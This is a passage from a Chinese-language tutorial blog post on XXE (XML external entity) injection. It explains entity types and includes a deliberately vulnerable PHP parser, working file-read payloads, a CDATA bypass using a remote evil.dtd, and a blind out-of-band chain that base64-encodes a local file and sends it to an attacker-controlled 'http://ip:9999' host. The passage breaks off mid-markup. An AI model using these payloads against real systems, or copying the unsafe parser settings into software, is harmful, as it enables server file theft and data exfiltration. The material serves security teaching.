<h6 id="这里-定义元素为-ANY-说明接受任何元素，但是定义了一个-xml-的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在-XML-中通过-amp-符号进行引用），那么-XML-就可以写成这样"><a href="#这里-定义元素为-ANY-说明接受任何元素，但是定义了一个-xml-的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在-XML-中通过-amp-符号进行引用），那么-XML-就可以写成这样" class="headerlink" title="这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样"></a>这里 定义元素为 ANY 说明接受任何元素，但是定义了一个 xml 的实体（这是我们在这篇文章中第一次看到实体的真面目，实体其实可以看成一个变量，到时候我们可以在 XML 中通过 &amp; 符号进行引用），那么 XML 就可以写成这样</h6><h5 id="示例代码：-3"><a href="#示例代码：-3" class="headerlink" title="示例代码："></a>示例代码：</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span>&amp;xxe;<span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">pass</span>&gt;</span>mypass<span class="tag">&lt;/<span class="name">pass</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="我们使用-amp-xxe-对-上面定义的-xxe-实体进行了引用，到时候输出的时候-amp-xxe-就会被-“test”-替换。"><a href="#我们使用-amp-xxe-对-上面定义的-xxe-实体进行了引用，到时候输出的时候-amp-xxe-就会被-“test”-替换。" class="headerlink" title="我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。"></a>我们使用 &amp;xxe 对 上面定义的 xxe 实体进行了引用，到时候输出的时候 &amp;xxe 就会被 “test” 替换。</h6><h4 id="下面是重点："><a href="#下面是重点：" class="headerlink" title="下面是重点："></a>下面是重点：</h4><h4 id="重点一："><a href="#重点一：" class="headerlink" title="重点一："></a>重点一：</h4><h6 id="实体分为两种，内部实体和外部实体，上面我们举的例子就是内部实体，但是实体实际上可以从外部的-dtd-文件中引用，我们看下面的代码："><a href="#实体分为两种，内部实体和外部实体，上面我们举的例子就是内部实体，但是实体实际上可以从外部的-dtd-文件中引用，我们看下面的代码：" class="headerlink" title="实体分为两种，内部实体和外部实体，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码："></a>实体分为两种，内部实体和外部实体，上面我们举的例子就是内部实体，但是实体实际上可以从外部的 dtd 文件中引用，我们看下面的代码：</h6><h5 id="示例代码：-4"><a href="#示例代码：-4" class="headerlink" title="示例代码："></a>示例代码：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">    &lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">    &lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<h6 id="这样对引用资源所做的任何更改都会在文档中自动更新-非常方便（方便永远是安全的敌人）"><a href="#这样对引用资源所做的任何更改都会在文档中自动更新-非常方便（方便永远是安全的敌人）" class="headerlink" title="这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（方便永远是安全的敌人）"></a>这样对引用资源所做的任何更改都会在文档中自动更新,非常方便（<code>方便永远是安全的敌人</code>）</h6><h6 id="当然，还有一种引用方式是使用-引用公用-DTD的方法，语法如下："><a href="#当然，还有一种引用方式是使用-引用公用-DTD的方法，语法如下：" class="headerlink" title="当然，还有一种引用方式是使用 引用公用 DTD的方法，语法如下："></a>当然，还有一种引用方式是使用 引用<code>公用 DTD</code>的方法，语法如下：</h6><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素名称 PUBLIC “DTD标识名” “公用DTD的URI”&gt;</span><br></pre></td></tr></table></figure>

<h6 id="这个在我们的攻击中也可以起到和-SYSTEM-一样的作用"><a href="#这个在我们的攻击中也可以起到和-SYSTEM-一样的作用" class="headerlink" title="这个在我们的攻击中也可以起到和 SYSTEM 一样的作用"></a>这个在我们的攻击中也可以起到和 SYSTEM 一样的作用</h6><h4 id="重点二："><a href="#重点二：" class="headerlink" title="重点二："></a>重点二：</h4><h5 id="我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体），别晕。。"><a href="#我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体），别晕。。" class="headerlink" title="我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体），别晕。。"></a>我们上面已经将实体分成了两个派别（内部实体和外部外部），但是实际上从另一个角度看，实体也可以分成两个派别（通用实体和参数实体），别晕。。</h5><h4 id="1-通用实体"><a href="#1-通用实体" class="headerlink" title="1.通用实体"></a>1.通用实体</h4><h5 id="用-amp-实体名-引用的实体，他在DTD-中定义，在-XML-文档中引用"><a href="#用-amp-实体名-引用的实体，他在DTD-中定义，在-XML-文档中引用" class="headerlink" title="用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用"></a>用 &amp;实体名; 引用的实体，他在DTD 中定义，在 XML 文档中引用</h5><h5 id="示例代码：-5"><a href="#示例代码：-5" class="headerlink" title="示例代码："></a>示例代码：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE updateProfile [&lt;!ENTITY file SYSTEM &quot;file:///c:/windows/win.ini&quot;&gt; ]&gt; </span><br><span class="line">&lt;updateProfile&gt;  </span><br><span class="line">    &lt;firstname&gt;Joe&lt;/firstname&gt;  </span><br><span class="line">    &lt;lastname&gt;&amp;file;&lt;/lastname&gt;  </span><br><span class="line">    ... </span><br><span class="line">&lt;/updateProfile&gt;</span><br><span class="line">``` </span><br><span class="line">#### 2.参数实体：</span><br><span class="line">##### (1)使用 `% 实体名`(这里面空格不能少) 在 DTD 中定义，并且只能在 DTD 中使用 `%实体名;`引用</span><br><span class="line">##### (2)只有在 DTD 文件中，参数实体的声明才能引用其他实体</span><br><span class="line">##### (3)和通用实体一样，参数实体也可以外部引用</span><br><span class="line">#### 示例代码：</span><br><span class="line">```dtd</span><br><span class="line">&lt;!ENTITY % an-element &quot;&lt;!ELEMENT mytag (subtag)&gt;&quot;&gt; </span><br><span class="line">&lt;!ENTITY % remote-dtd SYSTEM &quot;http://somewhere.example.org/remote.dtd&quot;&gt; </span><br><span class="line">%an-element; %remote-dtd;</span><br></pre></td></tr></table></figure>

<h4 id="四、我们能做什么"><a href="#四、我们能做什么" class="headerlink" title="四、我们能做什么"></a>四、我们能做什么</h4><h5 id="上一节疯狂暗示了外部实体，那他究竟能干什么？"><a href="#上一节疯狂暗示了外部实体，那他究竟能干什么？" class="headerlink" title="上一节疯狂暗示了外部实体，那他究竟能干什么？"></a>上一节疯狂暗示了<code>外部实体</code>，那他究竟能干什么？</h5><h5 id="例如下面这段代码。"><a href="#例如下面这段代码。" class="headerlink" title="例如下面这段代码。"></a>例如下面这段代码。</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;ISO-8859-1&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ELEMENT foo ANY &gt;</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:///c:/test.dtd&quot; &gt;]&gt;</span><br><span class="line">&lt;creds&gt;</span><br><span class="line">&lt;user&gt;&amp;xxe;&lt;/user&gt;</span><br><span class="line">&lt;pass&gt;mypass&lt;/pass&gt;</span><br><span class="line">&lt;/creds&gt;</span><br></pre></td></tr></table></figure>

<h5 id="既然能读-dtd-那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？"><a href="#既然能读-dtd-那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？" class="headerlink" title="既然能读 dtd 那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？"></a>既然能读 dtd 那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？</h5><h4 id="实验一：有回显读本地敏感文件-Normal-XXE"><a href="#实验一：有回显读本地敏感文件-Normal-XXE" class="headerlink" title="实验一：有回显读本地敏感文件(Normal XXE)"></a>实验一：有回显读本地敏感文件(Normal XXE)</h4><h5 id="这个实验的攻击场景模拟的是在服务能接收并解析-XML-格式的输入并且有回显的时候，我们就能输入我们自定义的-XML-代码，通过引用外部实体的方法，引用服务器上面的文件"><a href="#这个实验的攻击场景模拟的是在服务能接收并解析-XML-格式的输入并且有回显的时候，我们就能输入我们自定义的-XML-代码，通过引用外部实体的方法，引用服务器上面的文件" class="headerlink" title="这个实验的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件"></a>这个实验的攻击场景模拟的是在服务能接收并解析 XML 格式的输入并且有回显的时候，我们就能输入我们自定义的 XML 代码，通过引用外部实体的方法，引用服务器上面的文件</h5><h5 id="本地服务器上放上解析-XML-的-php-代码："><a href="#本地服务器上放上解析-XML-的-php-代码：" class="headerlink" title="本地服务器上放上解析 XML 的 php 代码："></a>本地服务器上放上解析 XML 的 php 代码：</h5><h4 id="示例代码：-6"><a href="#示例代码：-6" class="headerlink" title="示例代码："></a>示例代码：</h4><h5 id="xml-php"><a href="#xml-php" class="headerlink" title="xml.php"></a>xml.php</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">    libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">    $xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">    $dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">    $dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line">    $creds = simplexml_import_dom($dom);</span><br><span class="line">    <span class="keyword">echo</span> $creds;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="payload"><a href="#payload" class="headerlink" title="payload:"></a>payload:</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE creds [  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span>&amp;goodies;<span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h5 id="可以成功的读取到文件。"><a href="#可以成功的读取到文件。" class="headerlink" title="可以成功的读取到文件。"></a>可以成功的读取到文件。</h5><h6 id="但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利，如果我们在文件中很多的特殊字符呢。"><a href="#但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利，如果我们在文件中很多的特殊字符呢。" class="headerlink" title="但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利，如果我们在文件中很多的特殊字符呢。"></a>但是因为这个文件没有什么特殊符号，于是我们读取的时候可以说是相当的顺利，如果我们在文件中很多的特殊字符呢。</h6><h5 id="因此我们要用CDATA。"><a href="#因此我们要用CDATA。" class="headerlink" title="因此我们要用CDATA。"></a>因此我们要用<code>CDATA</code>。</h5><h5 id="有些内容可能不想让解析引擎解析执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的-lt-gt-amp-或者”-字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是-xml标记"><a href="#有些内容可能不想让解析引擎解析执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的-lt-gt-amp-或者”-字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是-xml标记" class="headerlink" title="有些内容可能不想让解析引擎解析执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 &lt;&gt; &amp; 或者” 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记"></a>有些内容可能不想让解析引擎解析执行，而是当做原始的内容处理，用于把整段数据解析为纯字符数据而不是标记的情况包含大量的 &lt;&gt; &amp; 或者” 字符，CDATA节中的所有字符都会被当做元素字符数据的常量部分，而不是 xml标记</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;![CDATA[</span><br></pre></td></tr></table></figure>

<h5 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">XXXXXXXXXXXXXXXXX</span><br><span class="line"></span><br><span class="line">]]&gt;</span><br><span class="line"></span><br><span class="line">可以输入任意字符除了 ]]&gt; 不能嵌套</span><br><span class="line"></span><br><span class="line">用处是万一某个标签内容包含特殊字符或者不确定字符，我们可以用 CDATA包起来</span><br></pre></td></tr></table></figure>

<h5 id="那我们把我们的读出来的数据放在-CDATA-中输出就能进行绕过，但是怎么做到，我们来简答的分析一下："><a href="#那我们把我们的读出来的数据放在-CDATA-中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：" class="headerlink" title="那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下："></a>那我们把我们的读出来的数据放在 CDATA 中输出就能进行绕过，但是怎么做到，我们来简答的分析一下：</h5><h5 id="首先，找到问题出现的地方，问题出现在"><a href="#首先，找到问题出现的地方，问题出现在" class="headerlink" title="首先，找到问题出现的地方，问题出现在"></a>首先，找到问题出现的地方，问题出现在</h5><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version="1.0" encoding="utf-8"?&gt;</span> </span><br><span class="line"><span class="meta">&lt;!DOCTYPE creds [  </span></span><br><span class="line"><span class="meta">&lt;!ENTITY goodies SYSTEM "file:///c:/windows/system.ini"&gt; ]&gt;</span> </span><br><span class="line"><span class="tag">&lt;<span class="name">creds</span>&gt;</span>&amp;goodies;<span class="tag">&lt;/<span class="name">creds</span>&gt;</span></span><br></pre></td></tr></table></figure>

<h6 id="引用并不接受可能会引起-xml-格式混乱的字符-在XML中，有时实体内包含了些字符，如-amp-lt-gt-”-’等。这些均需要对其进行转义，否则会对XML解释器生成错误-，我们想在引用的两边加上-“”-但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法"><a href="#引用并不接受可能会引起-xml-格式混乱的字符-在XML中，有时实体内包含了些字符，如-amp-lt-gt-”-’等。这些均需要对其进行转义，否则会对XML解释器生成错误-，我们想在引用的两边加上-“”-但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法" class="headerlink" title="引用并不接受可能会引起 xml 格式混乱的字符(在XML中，有时实体内包含了些字符，如&amp;,&lt;,&gt;,”,’等。这些均需要对其进行转义，否则会对XML解释器生成错误)，我们想在引用的两边加上 “”,但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法"></a>引用并不接受可能会引起 xml 格式混乱的字符(在XML中，有时实体内包含了些字符，如&amp;,&lt;,&gt;,”,’等。这些均需要对其进行转义，否则会对XML解释器生成错误)，我们想在引用的两边加上 “<!--[CDATA["和 “]]-->”,但是好像没有任何语法告诉我们字符串能拼接的，于是我想到了能不能使用多个实体连续引用的方法</h6><h5 id="注意，这里面的三个实体都是字符串形式，连在一起会报错，这说明我们不能在-xml-中进行拼接，而是需要在拼接以后再在-xml-中调用，那么要想在-DTD"><a href="#注意，这里面的三个实体都是字符串形式，连在一起会报错，这说明我们不能在-xml-中进行拼接，而是需要在拼接以后再在-xml-中调用，那么要想在-DTD" class="headerlink" title="注意，这里面的三个实体都是字符串形式，连在一起会报错，这说明我们不能在 xml 中进行拼接，而是需要在拼接以后再在 xml 中调用，那么要想在 DTD"></a>注意，这里面的三个实体都是字符串形式，连在一起会报错，这说明我们不能在 xml 中进行拼接，而是需要在拼接以后再在 xml 中调用，那么要想在 DTD</h5><h5 id="中拼接，我们知道我们只有一种选择，就是使用-参数实体"><a href="#中拼接，我们知道我们只有一种选择，就是使用-参数实体" class="headerlink" title="中拼接，我们知道我们只有一种选择，就是使用 参数实体"></a>中拼接，我们知道我们只有一种选择，就是使用 参数实体</h5><h5 id="payload如下：-1"><a href="#payload如下：-1" class="headerlink" title="payload如下："></a>payload如下：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt; </span><br><span class="line">&lt;!DOCTYPE roottag [</span><br><span class="line">&lt;!ENTITY % start &quot;&lt;![CDATA[&quot;&gt;   </span><br><span class="line">&lt;!ENTITY % goodies SYSTEM &quot;file:///d:/test.txt&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % end &quot;]]&gt;&quot;&gt;  </span><br><span class="line">&lt;!ENTITY % dtd SYSTEM &quot;http://ip/evil.dtd&quot;&gt; </span><br><span class="line">%dtd; ]&gt; </span><br><span class="line"></span><br><span class="line">&lt;roottag&gt;&amp;all;&lt;/roottag&gt;</span><br></pre></td></tr></table></figure>

<h5 id="evil-dtd"><a href="#evil-dtd" class="headerlink" title="evil.dtd"></a>evil.dtd</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt; </span><br><span class="line">&lt;!ENTITY all &quot;%start;%goodies;%end;&quot;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="现在就可以来去自由的读取了。"><a href="#现在就可以来去自由的读取了。" class="headerlink" title="现在就可以来去自由的读取了。"></a>现在就可以来去自由的读取了。</h5><h4 id="新的问题出现"><a href="#新的问题出现" class="headerlink" title="新的问题出现"></a>新的问题出现</h4><h5 id="但是，你想想也知道，本身人家服务器上的-XML-就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析-XML-的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带"><a href="#但是，你想想也知道，本身人家服务器上的-XML-就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析-XML-的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带" class="headerlink" title="但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带"></a>但是，你想想也知道，本身人家服务器上的 XML 就不是输出用的，一般都是用于配置或者在某些极端情况下利用其他漏洞能恰好实例化解析 XML 的类，因此我们想要现实中利用这个漏洞就必须找到一个不依靠其回显的方法——外带</h5><h4 id="新的解决方法"><a href="#新的解决方法" class="headerlink" title="新的解决方法"></a>新的解决方法</h4><h5 id="想要外带就必须能发起请求，那么什么地方能发起请求呢？-很明显就是我们的外部实体定义的时候，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了-并且根据规范，我们必须在一个-DTD-文件中才能完成“请求中引用另一次请求的结果”的要求"><a href="#想要外带就必须能发起请求，那么什么地方能发起请求呢？-很明显就是我们的外部实体定义的时候，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了-并且根据规范，我们必须在一个-DTD-文件中才能完成“请求中引用另一次请求的结果”的要求" class="headerlink" title="想要外带就必须能发起请求，那么什么地方能发起请求呢？ 很明显就是我们的外部实体定义的时候，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求)"></a>想要外带就必须能发起请求，那么什么地方能发起请求呢？ 很明显就是我们的外部实体定义的时候，其实光发起请求还不行，我们还得能把我们的数据传出去，而我们的数据本身也是一个对外的请求，也就是说，我们需要在请求中引用另一次请求的结果，分析下来只有我们的参数实体能做到了(并且根据规范，我们必须在一个 DTD 文件中才能完成“请求中引用另一次请求的结果”的要求)</h5><h4 id="实验二：无回显读取本地敏感文件-Blind-OOB-XXE"><a href="#实验二：无回显读取本地敏感文件-Blind-OOB-XXE" class="headerlink" title="实验二：无回显读取本地敏感文件(Blind OOB XXE)"></a>实验二：无回显读取本地敏感文件(Blind OOB XXE)</h4><h5 id="xml-php-1"><a href="#xml-php-1" class="headerlink" title="xml.php"></a>xml.php</h5><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line">libxml_disable_entity_loader (<span class="keyword">false</span>);</span><br><span class="line">$xmlfile = file_get_contents(<span class="string">'php://input'</span>);</span><br><span class="line">$dom = <span class="keyword">new</span> DOMDocument();</span><br><span class="line">$dom-&gt;loadXML($xmlfile, LIBXML_NOENT | LIBXML_DTDLOAD); </span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h4 id="test-dtd"><a href="#test-dtd" class="headerlink" title="test.dtd"></a>test.dtd</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % file SYSTEM &quot;php://filter/read=convert.base64-encode/resource=file:///D:/test.txt&quot;&gt;</span><br><span class="line">&lt;!ENTITY % int &quot;&lt;!ENTITY % send SYSTEM &apos;http://ip:9999?p=%file;&apos;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure>

<h5 id="我发现上面这段代码由于解析的问题将-send-前面的-HTML-实体转化成了-虽然我在下面做出了一些解释，但是因为存在复制粘贴代码的行为，因此我决定还是在这里用图片的形式再次展示一下我的代码"><a href="#我发现上面这段代码由于解析的问题将-send-前面的-HTML-实体转化成了-虽然我在下面做出了一些解释，但是因为存在复制粘贴代码的行为，因此我决定还是在这里用图片的形式再次展示一下我的代码" class="headerlink" title="我发现上面这段代码由于解析的问题将 send 前面的 HTML 实体转化成了 % ,虽然我在下面做出了一些解释，但是因为存在复制粘贴代码的行为，因此我决定还是在这里用图片的形式再次展示一下我的代码"></a>我发现上面这段代码由于解析的问题将 send 前面的 HTML 实体转化成了 % ,虽然我在下面做出了一些解释，但是因为存在复制粘贴代码的行为，因此我决定还是在这里用图片的形式再次展示一下我的代码</h5><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20190508205142-077ed10c-7190-1.png" alt></p>
<h5 id="payload-1"><a href="#payload-1" class="headerlink" title="payload:"></a>payload:</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE convert [ </span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http://ip/test.dtd&quot;&gt;</span><br><span class="line">%remote;%int;%send;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure>

<h5 id="结果如下：-2"><a href="#结果如下：-2" class="headerlink" title="结果如下："></a>结果如下：</h5><p><img src="https://xzfile.aliyuncs.com/media/upload/picture/20181120002647-e90baeb4-ec17-1.png" alt></p>
<h5 id="我们清楚第看到服务器端接收到了我们用-base64-编码后的敏感文件信息-编码也是为了不破坏原本的XML语法-，不编码会报错。"><a href="#我们清楚第看到服务器端接收到了我们用-base64-编码后的敏感文件信息-编码也是为了不破坏原本的XML语法-，不编码会报错。" class="headerlink" title="我们清楚第看到服务器端接收到了我们用 base64 编码后的敏感文件信息(编码也是为了不破坏原本的XML语法)，不编码会报错。"></a>我们清楚第看到服务器端接收到了我们用 base64 编码后的敏感文件信息(编码也是为了不破坏原本的XML语法)，不编码会报错。</h5><h4 id="整个调用过程："><a href="#整个调用过程：" class="headerlink" title="整个调用过程："></a>整个调用过程：</h4><h5 id="我们从-payload-中能看到-连续调用了三个参数实体-remote-int-send-，这就是我们的利用顺序，-remote-先调用，调用后请求远程服务器上的-test-dtd-，有点类似于将-test-dtd-包含进来，然后-int-调用-test-dtd-中的-file-file-就会去获取服务器上面的敏感文件，然后将-file-的结果填入到-send-以后-因为实体的值中不能有-所以将其转成html实体编码-amp-37-，我们再调用-send-把我们的读取到的数据发送到我们的远程-vps-上，这样就实现了外带数据的效果，完美的解决了-XXE-无回显的问题。"><a href="#我们从-payload-中能看到-连续调用了三个参数实体-remote-int-send-，这就是我们的利用顺序，-remote-先调用，调用后请求远程服务器上的-test-dtd-，有点类似于将-test-dtd-包含进来，然后-int-调用-test-dtd-中的-file-file-就会去获取服务器上面的敏感文件，然后将-file-的结果填入到-send-以后-因为实体的值中不能有-所以将其转成html实体编码-amp-37-，我们再调用-send-把我们的读取到的数据发送到我们的远程-vps-上，这样就实现了外带数据的效果，完美的解决了-XXE-无回显的问题。" class="headerlink" title="我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 &amp;#37;)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。"></a>我们从 payload 中能看到 连续调用了三个参数实体 %remote;%int;%send;，这就是我们的利用顺序，%remote 先调用，调用后请求远程服务器上的 test.dtd ，有点类似于将 test.dtd 包含进来，然后 %int 调用 test.dtd 中的 %file, %file 就会去获取服务器上面的敏感文件，然后将 %file 的结果填入到 %send 以后(因为实体的值中不能有 %, 所以将其转成html实体编码 <code>&amp;#37;</code>)，我们再调用 %send; 把我们的读取到的数据发送到我们的远程 vps 上，这样就实现了外带数据的效果，完美的解决了 XXE 无回显的问题。</h5><h4 id="新的思考："><a href="#新的思考：" class="headerlink" title="新的思考："></a>新的思考：</h4><h5 